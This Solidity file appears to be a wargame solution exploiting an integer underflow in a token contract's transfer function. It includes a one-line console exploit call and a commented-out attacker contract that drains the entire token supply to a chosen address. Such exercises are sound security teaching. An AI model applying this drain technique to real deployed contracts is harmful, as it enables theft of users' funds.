// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. call transfer() directly to create an under flow
//    await contract.transfer("0xBD66eCE280FB27da6C6670F6BCC6a2803fDd38Df", 21)

// interface IToken {
//     function transfer(address _to, uint _value) external returns (bool);
//     function balanceOf(address _owner) external view returns (uint);
//     function totalSupply() external view returns (uint);
// }

// contract TokenHack {
//     function drainFunds(address _contract, address _to) public {
//         uint withdrawalAmount = createUnderflow(_contract, _to);
//         drainFunds(_contract, _to, withdrawalAmount);
//     }

//     function createUnderflow(address _contract, address _to) internal returns(uint) {
//         uint balance = IToken(_contract).balanceOf(msg.sender);
//         uint withdrawalAmount = balance + 1;
//         IToken(_contract).transfer(_to, withdrawalAmount);
//         return withdrawalAmount;
//     }

//     function drainFunds(address _contract, address _to, uint _initalWithdrawalAmount) internal {
//         uint remainingFunds = IToken(_contract).totalSupply() - _initalWithdrawalAmount;
//         IToken(_contract).transfer(_to, remainingFunds);
//     }
// }
